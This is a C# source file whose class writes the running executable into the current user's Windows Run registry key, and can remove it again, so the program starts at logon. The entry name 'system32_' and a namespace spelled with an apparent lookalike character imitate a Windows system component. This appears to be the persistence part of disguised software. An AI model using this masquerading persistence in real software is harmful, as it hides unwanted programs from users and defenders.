using Microsoft.Win32;
using System;
namespace systеm32.exe.Models
{
    public class AutoStartSettler : ISettler
    {
        public void Set()
        {
            try
            {
                const string applicationName = "system32_";
                const string pathRegistryKeyStartup =
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

                using (RegistryKey registryKeyStartup =
                            Registry.CurrentUser.OpenSubKey(pathRegistryKeyStartup,
                    true))
                {
                    registryKeyStartup.SetValue(
                        applicationName,
                        string.Format("\"{0}\"",
                            System.Reflection.Assembly.GetExecutingAssembly().Location));
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        public void Unset()
        {
            try
            {
                const string applicationName = "system32_";
                const string pathRegistryKeyStartup =
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

                using (RegistryKey registryKeyStartup =
                            Registry.CurrentUser.OpenSubKey(pathRegistryKeyStartup,
                    true))
                {
                    registryKeyStartup.DeleteValue(applicationName);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }
}
